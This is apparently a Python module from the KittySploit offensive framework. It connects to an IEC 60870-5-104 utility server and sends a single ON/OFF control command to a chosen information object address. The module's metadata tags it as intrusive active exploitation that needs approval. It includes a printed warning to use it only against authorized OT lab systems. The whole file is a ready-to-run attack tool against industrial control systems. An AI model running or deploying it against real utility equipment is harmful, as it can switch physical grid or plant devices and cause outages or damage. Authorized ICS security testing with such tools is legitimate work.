#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.ics.constants import ICS_PROTOCOL_PORTS
from lib.protocols.ics.ics_scanner_client import Ics_scanner_client
from lib.protocols.ics.iec104_client import Iec104Client


class Module(Post, Ics_scanner_client):
    __info__ = {
        "name": "IEC104 single command",
        "description": "Sends an IEC 60870-5-104 single command (C_SC_NA_1) to a utility server",
        "author": "KittySploit Team",
        "tags": ["ics", "iec104", "utilities", "command"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 3,
        'reversible': True,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['ot_assets', 'modbus_tcp', 's7comm', 'dnp3_access'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    port = OptPort(ICS_PROTOCOL_PORTS["iec104"], "IEC104 TCP port", True)
    common_address = OptInteger(1, "Common address (CA)", False)
    ioa = OptInteger(1, "Information object address (IOA)", True)
    value = OptBool(True, "Command value ON/OFF", True)
    select = OptBool(False, "Send select before execute", False)

    def check(self):
        return bool(self._host())

    def run(self):
        host = self._host()
        if not host:
            print_error("Target is required")
            return False
        print_warning("Only run against authorized utility/OT lab systems")
        client = Iec104Client(host, self._port(), self._timeout(), int(self.common_address or 1))
        if not client.connect():
            print_error("Connection failed")
            return False
        try:
            if not client.startdt():
                print_error("STARTDT not confirmed")
                return False
            if client.single_command(int(self.ioa), bool(self.value), bool(self.select)):
                print_success(f"Single command sent IOA={self.ioa} value={int(bool(self.value))}")
                return True
            print_error("Single command failed")
            return False
        finally:
            client.close()
